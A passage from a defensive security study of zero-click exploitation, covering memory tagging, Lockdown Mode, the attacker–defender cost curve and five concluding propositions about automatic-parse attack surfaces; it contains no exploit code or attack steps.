The reason synchronous memory tagging matters so much to this specific threat is that it attacks the primitive, not the bug. It does not require knowing in advance which overflow an attacker will use; it detects the moment a corrupted access touches memory it should not, across the kernel and more than seventy userland processes. Apple's stated assessment, from testing MIE against real mercenary chains of the prior three years, is that it disrupts many of the most effective exploitation techniques of the last twenty-five years and makes the chains dramatically more expensive to build and maintain.37 Project Zero's own commentary on production memory tagging reached a compatible conclusion: detecting corruption at the first dangerous access is a real step toward making zero-day harder.38

High-risk user mode

Finally, for the small population actually targeted by these capabilities, platforms now offer an aggressive reachability-reduction mode. Apple's Lockdown Mode deliberately disables or constrains the exact automatic-parsing features that zero-click chains exploit — attachment handling, certain web technologies, and link-preview generation among them — accepting a loss of convenience in exchange for a sharply diminished surface.36 Its efficacy is not theoretical: in the BLASTPASS case, Apple confirmed to Citizen Lab that Lockdown Mode blocked the in-the-wild chain.13 Lockdown Mode is the user-facing acknowledgement of this study's central principle — that the surface is the automatic parsing, and that the most direct defense for a high-risk individual is simply to turn as much of it off as they can tolerate.

§ 13Trajectory of the arms race

The zero-click attack will not disappear, because its substrate — automatic processing of untrusted input — is intrinsic to what networked devices do. A phone that did not parse inbound messages, a server that did not handle inbound requests, a modem that did not interpret network signaling would not be useful. The surface is therefore permanent in kind, even as it shrinks in extent. What is changing, and changing fast, is the cost curve.

For most of the past decade the curve favored the attacker. A single memory-corruption bug on an automatic parse path, elaborated into a weird machine and composed into a chain, defeated the most hardened devices in existence, and the defender's only recourse was to find and fix bugs one at a time — a race the defender cannot win against a well-funded adversary with a deep bug inventory. The structural mitigations have begun to bend the curve back. Sandboxing forces more bugs per chain. Memory-safe rewrites delete whole families of primitive. And synchronous memory tagging, in particular, changes the character of the contest: it does not ask the defender to predict the attacker's bug, only to catch the corrupted access the bug produces — a defense that scales across the entire surface at once rather than bug by bug.

The honest assessment, voiced by researchers at the launch of production memory tagging, is that this is a meaningful but not final advance. Some practitioners suggested that for a period certain mercenary vendors might simply lack working exploits against the newest hardware, while cautioning that the dynamic remains a cat-and-mouse game in which the offense regroups.38 Three forces guarantee the contest continues. First, the logic-bug frontier: as FORCEDENTRY's sandbox escape and Triangulation's NSExpression stages showed, the most sophisticated attackers already lean on flaws that memory-safety mitigations do not touch, and as memory corruption grows harder, logic and design flaws become relatively more attractive. Second, the installed base: the newest silicon protects only the devices that have it, while billions of older handsets, and the entire universe of servers and embedded systems, retain the unsafe parsers and the missing mitigations described throughout this study. Third, the shared-codec and baseband depths, where a single library or a single modem firmware spans an enormous population and sits beneath much of the new tagging hardware's reach.

Synthesis

Five propositions that survive the case studies

1. The surface is the automatic parse. Every case in this study reduces to attacker-shaped data interpreted by code before any human consents. To find the next zero-click, find the next thing a device parses on its own.

2. Reachability sets the value. The same bug is worth a bug-bounty footnote or a seven-figure capability depending only on whether a remote party can reach it automatically.

3. Capability is a chain, defense is per-transition. Real exploits cross delivery, primitive, code-exec, escape, and kernel; durable defenses raise the cost of each crossing rather than chasing individual bugs.

4. Shared codecs are the multiplier. One overflow in a universal media library is simultaneously a flaw in every channel that decodes the format — the single most efficient target in the taxonomy.

5. The trigger and the payload are independent. "Interaction-free" describes how the attack fires, not what it does; an NTLM leak and a kernel implant are both zero-click, and both cost the attacker only a well-formed message.

What has genuinely changed is the strategic posture of the defense. For years it was reactive — awaiting a Citizen Lab forensic report, a Project Zero teardown, a Securelist reconstruction, and then patching the specific bug that had already been used against a specific victim. The current generation of mitigations is, for the first time, anticipatory and structural: it does not wait to learn which bug the adversary chose, because it raises the cost of the entire technique class. That is the most consequential shift in the two-decade history of this threat. It will not end the arms race — the substrate is permanent and the offense is resourceful and patient — but it changes the economics that determine who can afford to play, and in a domain where the principal victims have been journalists, lawyers, and dissidents, raising the price of a delivered exploit is itself a meaningful defense of the people most often on the receiving end of one.
